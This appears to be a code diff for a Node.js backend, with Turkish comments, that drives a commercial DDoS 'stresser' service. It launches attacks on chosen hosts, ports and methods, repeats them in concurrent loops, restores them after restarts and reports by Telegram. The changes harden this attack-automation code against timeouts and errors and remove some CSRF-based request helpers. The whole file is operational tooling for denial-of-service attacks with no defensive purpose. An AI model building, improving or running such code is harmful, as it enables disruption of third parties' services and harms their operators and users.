@@ -25,6 +25,11 @@ if (typeof net.setDefaultAutoSelectFamily === 'function') {
 }
 dns.setDefaultResultOrder('ipv4first');
 
+// Beklenmedik promise rejection'lari yutma: logla ama process'i oldurme.
+process.on('unhandledRejection', (err) => {
+  console.error('[unhandledRejection]', err);
+});
+
 const app = express();
 const PORT = process.env.PORT || 3001;
 
@@ -88,13 +93,10 @@ const sessions = {};
 const activeLoops = {};
 
 // Global loop scheduler: her loop bagimsiz calisir. Ayni loopId'den ayni anda
-// sadece 1 tur calisir. Bir loop'un turu bittikten sonra kendi arasinda
-// LOOP_QUEUE_DELAY_MS kadar bekler.
+// sadece 1 tur calisir.
 let loopQueue = [];
 let isProcessingLoopQueue = false;
 const activeLoopRounds = new Set();
-const LOOP_QUEUE_DELAY_MS = 5000;
-const MAX_REQUEST_RETRIES = 3;
 
 // Active normal attacks registry: { attackId: { username, host, port, method, time, startedAt, expiresAt } }
 const activeAttacks = {};
@@ -253,7 +255,7 @@ function loadState() {
       // Geri yuklenen loop'larin motorunu tekrar calistir
       Object.keys(activeLoops).forEach((loopId) => {
         console.log(`[persistence] Restarting loop ${loopId}`);
-        runLoop(loopId);
+        runLoop(loopId).catch((err) => console.error(`[persistence] runLoop ${loopId} hatasi:`, err));
       });
     }
   } catch (err) {
@@ -374,47 +376,6 @@ async function startAttackApi(apiClient, params) {
   }
 }
 
-// stresse.st paneli concurrents kadar ayrı POST /attack istegi atar.
-// Asagidaki fonksiyonlar panelin gercek davranisini taklit eder.
-async function getCsrfToken(sessionId) {
-  const client = getClient(sessionId);
-  const res = await client.get('/csrf-token', { timeout: 15000 });
-  return res.data?.csrfToken || res.data?.token || '';
-}
-
-async function startAttackPostApi(sessionId, params) {
-  const client = getClient(sessionId);
-  const csrfToken = await getCsrfToken(sessionId);
-  const isL7 = params.layer === 'L7';
-  const bareHost = normalizeHost(params.host);
-  const host = isL7 ? `https://${bareHost}` : bareHost;
-  const body = {
-    host,
-    port: parseInt(params.port) || 0,
-    time: parseInt(params.time) || 0,
-    method: String(params.method || '').toUpperCase(),
-    geo: params.geo || 'worldwide'
-  };
-  if (!isL7) {
-    body.subnet = params.subnet || '32';
-  }
-  try {
-    const res = await client.post('/attack', body, {
-      headers: { 'X-CSRF-Token': csrfToken },
-      timeout: 15000
-    });
-    console.log(`[POST /attack] status=${res.status} data=${JSON.stringify(res.data).slice(0, 200)}`);
-    return res.data;
-  } catch (err) {
-    if (err.response) {
-      console.error(`[POST /attack] HTTP ${err.response.status} error:`, JSON.stringify(err.response.data).slice(0, 400));
-    } else {
-      console.error(`[POST /attack] request error:`, err.message);
-    }
-    throw err;
-  }
-}
-
 async function launchAttacksGet(sessionId, params, concurrents, loopId = null) {
   const session = sessions[sessionId];
   if (!session || !session.apiToken) {
@@ -425,6 +386,9 @@ async function launchAttacksGet(sessionId, params, concurrents, loopId = null) {
   const beforeIds = new Set(await fetchOngoingAttackIds(sessionId, params, 1000));
 
   // Tek istekte istenen concurrents kadar saldiri baslat.
+  // Istegin baslangic zamanini tut; timeout kurtarmasinda sadece bu istekten
+  // SONRA baslamis saldirilari kurtar (baska kullanicininkileri degil).
+  const requestStartedAt = Date.now();
   let data;
   try {
     data = await startAttackApi(getApiClient(sessionId), {
@@ -438,11 +402,15 @@ async function launchAttacksGet(sessionId, params, concurrents, loopId = null) {
     if (err.code === 'ECONNABORTED' || /timeout/i.test(err.message || '')) {
       console.warn(`[launchAttacksGet] GET /api timeout; /ongoing'den kurtarma deneniyor...`);
       await new Promise((r) => setTimeout(r, 4000));
-      const salvageIds = new Set(await fetchOngoingAttackIds(sessionId, params, 1000));
+      const salvageIds = new Set(await fetchOngoingAttackIds(sessionId, params, 1000, requestStartedAt));
       const recovered = [...salvageIds].filter((id) => !beforeIds.has(id)).slice(0, concurrents);
       if (recovered.length > 0) {
         console.log(`[launchAttacksGet] timeout'a ragmen ${recovered.length} saldiri kurtarildi`);
-        return { data: { status: 'success', recovered: true }, attackIds: recovered };
+        return {
+          data: { status: 'success', recovered: true },
+          attackIds: recovered,
+          elapsedSec: Math.round((Date.now() - requestStartedAt) / 1000)
+        };
       }
     }
     console.error(`[launchAttacksGet] GET /api hata:`, err.message);
@@ -477,7 +445,8 @@ async function launchAttacksGet(sessionId, params, concurrents, loopId = null) {
 
   return {
     data,
-    attackIds: newIds.slice(0, concurrents)
+    attackIds: newIds.slice(0, concurrents),
+    elapsedSec: 0
   };
 }
 
@@ -529,8 +498,11 @@ function notifyLoopRemoved(loop, action) {
   sendTelegram(message).catch(() => {});
 }
 
-function registerAttack(attackId, sessionId, params, loopId = null, concurrents = 1) {
+function registerAttack(attackId, sessionId, params, loopId = null, concurrents = 1, elapsedSec = 0) {
   if (!attackId || !sessionId) return;
+  // Kurtarma (salvage) yolunda saldiri istegi gonderileli elapsedSec gecti;
+  // expiresAt'i bu kadar kisalt ki saldiri erken silinmesin/gec silinmesin.
+  const remainingSec = Math.max(1, (parseInt(params.time) || 0) - (parseInt(elapsedSec) || 0));
   activeAttacks[attackId] = {
     attackId,
     sessionId,
@@ -543,7 +515,7 @@ function registerAttack(attackId, sessionId, params, loopId = null, concurrents 
     concurrents: parseInt(concurrents) || 1,
     loopId: loopId || null,
     startedAt: new Date().toISOString(),
-    expiresAt: new Date(Date.now() + (parseInt(params.time) || 0) * 1000).toISOString()
+    expiresAt: new Date(Date.now() + remainingSec * 1000).toISOString()
   };
   lastAttackCount = Object.keys(activeAttacks).length;
   saveState();
@@ -788,25 +760,6 @@ function getMinTime(method, layer) {
 
 function isFreeMethod(method) {
   return typeof method === 'string' && method.toUpperCase().startsWith('FREE-');
-}
-
-/**
- * L7 hedef URL'yi normalize eder:
- * - Protokol yoksa https:// ekler
- * - Sonunda / yoksa ekler
- * - Varolan protokol ve path korunur
- */
-function normalizeUrl(url) {
-  if (!url || typeof url !== 'string') return url;
-  let u = url.trim();
-  if (!/^https?:\/\//i.test(u)) {
-    u = 'https://' + u;
-  }
-  // Fazladan /path kisimlarini koruyoruz ama en azindan trailing slash olsun
-  if (!u.endsWith('/')) {
-    u += '/';
-  }
-  return u;
 }
 
 function getJar(sessionId) {
@@ -1173,6 +1126,9 @@ app.post('/api/stresse/attack', async (req, res) => {
         concurrents: 1,
         attackIds
       });
+    } else if (data?.status === 'success') {
+      // stresse.st success dondu ama ID cikaramadik; saldiri kayitsiz kalir.
+      console.warn(`[attack] stresse.st success dondu ama attackId bulunamadi: host=${host} method=${method}`);
     }
 
     res.json({
@@ -1338,16 +1294,6 @@ app.post('/api/stresse/test-api', async (req, res) => {
  */
 const MAX_LOOP_CONSECUTIVE_ERRORS = 10;
 
-async function fetchCsrfToken(client, loopId) {
-  try {
-    const csrfRes = await client.get('/csrf-token');
-    return csrfRes.data.csrfToken || null;
-  } catch (err) {
-    console.error(`[loop ${loopId}] CSRF token alinamadi:`, err.message);
-    return null;
-  }
-}
-
 async function runLoop(loopId) {
   const loop = activeLoops[loopId];
   if (!loop || !loop.sessionId) {
@@ -1362,7 +1308,7 @@ async function runLoop(loopId) {
     loopQueue.push(loopId);
     console.log(`[loop ${loopId}] kuyruga eklendi. Sira: ${loopQueue.length}`);
   }
-  processLoopQueue();
+  processLoopQueue().catch((err) => console.error('[scheduler] processLoopQueue beklenmeyen hata:', err));
 }
 
 async function processLoopQueue() {
@@ -1403,14 +1349,16 @@ async function processLoopQueue() {
         cleanupLoop(loopId);
       }
       // Scheduler'i tekrar calistir
-      processLoopQueue();
-    });
+      processLoopQueue().catch((err) => console.error('[scheduler] processLoopQueue beklenmeyen hata:', err));
+    }).catch((err) => console.error('[scheduler] runLoopRound beklenmeyen hata:', err));
   }
 
   isProcessingLoopQueue = false;
 }
 
-async function fetchOngoingAttackIds(sessionId, params, limit = 1) {
+// sinceMs verilirse sadece bu zamandan sonra baslamis saldirilar doner
+// (timeout kurtarmasinda baska isteklerin saldirilarini kurtarmamak icin).
+async function fetchOngoingAttackIds(sessionId, params, limit = 1, sinceMs = null) {
   try {
     const session = sessions[sessionId];
     if (!session?.username) return [];
@@ -1431,6 +1379,7 @@ async function fetchOngoingAttackIds(sessionId, params, limit = 1) {
       const hostPart = target.split(':')[0];
       if (hostPart !== params.host) return false;
       const startedAt = new Date(a.startedAt || a.start_time || a.started_at || now).getTime();
+      if (sinceMs && startedAt < sinceMs) return false;
       return now - startedAt < 2 * 60 * 1000;
     });
     matching.sort((a, b) =>
@@ -1453,6 +1402,7 @@ async function runLoopRound(loopId) {
   const session = sessions[loop.sessionId];
   if (!session || !session.apiToken) {
     console.error(`[loop ${loopId}] API token bulunamadi, loop durduruluyor`);
+    loop.stopReason = 'error';
     loop.running = false;
     saveState();
     return;
@@ -1521,12 +1471,12 @@ async function runLoopRound(loopId) {
   // Tek istekte istenen concurrents kadar saldiri baslat.
   // Gelen attack_id'lerden sadece onceki /ongoing'de olmayan yeni ID'leri kaydet.
   try {
-    const { data, attackIds } = await launchAttacksGet(loop.sessionId, loop.params, loop.params.concurrents, loopId);
+    const { data, attackIds, elapsedSec } = await launchAttacksGet(loop.sessionId, loop.params, loop.params.concurrents, loopId);
     if (attackIds.length > 0) {
       roundSuccesses = attackIds.length;
       loop.roundAttackIds = attackIds;
       attackIds.forEach((attackId) => {
-        registerAttack(attackId, loop.sessionId, loop.params, loopId);
+        registerAttack(attackId, loop.sessionId, loop.params, loopId, 1, elapsedSec || 0);
       });
       console.log(`[loop ${loopId}] round ${round} basarili: ${attackIds.length} saldiri (istenen: ${loop.params.concurrents})`);
       if (attackIds.length !== loop.params.concurrents) {
@@ -1551,10 +1501,16 @@ async function runLoopRound(loopId) {
     console.error(`[loop ${loopId}] round ${round} tamamen basarisiz (${loop.consecutiveErrors}/${MAX_LOOP_CONSECUTIVE_ERRORS}): ${roundError?.message}`);
     if (loop.consecutiveErrors >= MAX_LOOP_CONSECUTIVE_ERRORS) {
       console.error(`[loop ${loopId}] Cok fazla hata, loop otomatik durduruluyor`);
+      loop.stopReason = 'error';
       loop.running = false;
     }
   } else {
     loop.consecutiveErrors = 0;
+    // Basarili tur sonrasi loop history'sinin expiresAt'ini uzat; yoksa cleanup
+    // uzun suren loop'larda kaydi erken "completed" isaretleyebilir.
+    if (loop.historyId && attackHistory[loop.historyId]) {
+      attackHistory[loop.historyId].expiresAt = new Date(Date.now() + loop.params.time * 1000).toISOString();
+    }
   }
 
   // Saldiri stresse.st uzerinde time saniye surer; loop'un siradaki turu
@@ -1590,8 +1546,9 @@ function cleanupLoop(loopId) {
   delete activeLoops[loopId];
   saveState();
   console.log(`[loop ${loopId}] temizlendi (${removed} pending kayit silindi)`);
-  // Loop dogal olarak bitti (round'lar tamamlandi), Telegram bildirimi gonder.
-  notifyLoopRemoved(finishedLoop, 'tamamlandi');
+  // Loop dogal olarak bitti (round'lar tamamlandi) veya hata nedeniyle durdu;
+  // Telegram bildirimini buna gore gonder.
+  notifyLoopRemoved(finishedLoop, finishedLoop?.stopReason === 'error' ? 'durduruldu' : 'tamamlandi');
   checkSlotsEmpty();
 }
 
@@ -1631,10 +1588,6 @@ app.post('/api/stresse/loop', async (req, res) => {
       return res.status(403).json({ status: 'error', message: planCheck.message });
     }
 
-    if (activeLoops[loopId] && activeLoops[loopId].running) {
-      return res.status(409).json({ status: 'error', message: 'Loop already running', loopId });
-    }
-
     // Loop saldirisini history'ye sadece bir kez kaydet
     const historyId = addAttackHistory(sessionId, { host, port, method, time, layer }, {
       loop: true,
@@ -1657,7 +1610,7 @@ app.post('/api/stresse/loop', async (req, res) => {
     };
 
     // Loop'u arka planda calistir, response hemen donsun
-    runLoop(loopId);
+    runLoop(loopId).catch((err) => console.error(`[loop ${loopId}] runLoop beklenmeyen hata:`, err));
 
     res.json({ status: 'success', loopId, message: 'Loop baslatildi' });
     saveState();
@@ -2104,12 +2057,6 @@ app.get('/api/fofa', async (req, res) => {
  * GET /api/stresse/live/:username
  * Server-Sent Events stream of ongoing attacks
  */
-// Session ID'yi loglarda gostermemek icin maskele
-function maskSessionId(id) {
-  if (!id || id.length < 8) return '***';
-  return `${id.slice(0, 3)}...${id.slice(-3)}`;
-}
-
 app.get('/api/stresse/live/:username', async (req, res) => {
   const sessionId = req.headers['sessionid'] || req.headers['sessionId'] || req.query.sid || req.query.SID;
   const { username } = req.params;
@@ -2165,6 +2112,8 @@ app.get('/api/health', (req, res) => {
 
 // Load persisted sessions/loops before starting server
 loadState();
+// Restart sonrasi slot bildirimi kacmasin: geri yuklenen saldiri sayisini baz al.
+lastAttackCount = Object.keys(activeAttacks).length;
 
 app.listen(PORT, '127.0.0.1', () => {
   console.log(`Loki backend running on http://localhost:${PORT}`);
